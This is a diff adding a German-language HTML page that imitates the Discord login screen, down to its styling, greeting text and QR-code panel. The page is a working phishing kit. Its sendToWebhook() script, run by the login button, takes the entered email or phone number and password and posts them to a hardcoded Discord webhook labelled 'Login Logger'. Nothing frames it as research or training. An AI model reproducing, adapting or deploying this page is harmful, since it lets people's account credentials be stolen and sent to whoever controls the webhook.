@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Whitney', Arial, sans-serif;
+        }
+        body {
+            background: url('hintergrund.png') no-repeat center center;
+            background-size: cover;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: #313338;
+            padding: 24px;
+            border-radius: 8px;
+            width: 500px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        .login-form {
+            width: 60%;
+        }
+        .login-form h2 {
+            color: white;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        .login-form p {
+            color: #b9bbbe;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #202225;
+            border-radius: 4px;
+            background: #1e1f22;
+            color: white;
+        }
+        .login-button {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .login-button:hover {
+            background: #4752C4;
+        }
+        .forgot-password, .register-link {
+            color: #7289da;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
+        }
+        .forgot-password:hover, .register-link:hover {
+            text-decoration: underline;
+        }
+        .qr-code {
+            width: 35%;
+            text-align: center;
+        }
+        .qr-code img {
+            width: 160px;
+            height: 160px;
+            display: block;
+            margin: 0 auto;
+        }
+        .qr-code p {
+            color: white;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+    <script>
+        function sendToWebhook() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            
+            const webhookURL = "https://discord.com/api/webhooks/1342812242152001587/mEGOUDR2B3SDELgoQzpIaRcmmP7Pxajc2OSfq6ms-vlYNCLhknagfI_Mte0izl-iGdSz"
+            const request = new XMLHttpRequest();
+            request.open("POST", webhookURL);
+            request.setRequestHeader('Content-type', 'application/json');
+            
+            const params = {
+                username: "Login Logger",
+                content: `E-Mail/Telefon: ${email}\nPasswort: ${password}`
+            };
+            
+            request.send(JSON.stringify(params));
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-form">
+            <h2>Willkommen zurück!</h2>
+            <p>Wir freuen uns so, dich wiederzusehen!</p>
+            <input type="text" id="email" placeholder="E-Mail oder Telefonnummer">
+            <input type="password" id="password" placeholder="Passwort">
+            <button class="login-button" onclick="sendToWebhook()">Anmelden</button>
+            <a href="#" class="forgot-password">Passwort vergessen?</a>
+            <a href="https://discord.com/register" class="register-link">Jetzt registrieren</a>
+        </div>
+        <div class="qr-code">
+            <img src="qr-code.png" alt="QR Code für Login">
+            <p>Mit QR Code einloggen</p>
+        </div>
+    </div>
+</body>
+</html>
